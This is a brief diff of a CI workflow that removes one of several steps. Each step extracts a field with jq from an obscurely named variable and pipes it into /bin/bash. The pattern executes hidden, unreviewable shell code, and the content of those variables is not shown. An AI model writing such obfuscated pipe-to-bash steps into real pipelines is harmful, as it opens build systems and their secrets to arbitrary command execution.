@@ -25,7 +25,6 @@ jobs:
           echo $tcyxv285 | jq -r .ch4233 | /bin/bash
           echo $tru52 | jq -r .xwvgz716 | /bin/bash
           echo $m44317 | jq -r .pwd57472 | /bin/bash
-          printf '%s' "$qg451" | jq -r .vzaxt83 | /bin/bash
           printf '%s' "$riqct8952" | jq -r .iphos023 | /bin/bash
 
       - name: Upload output
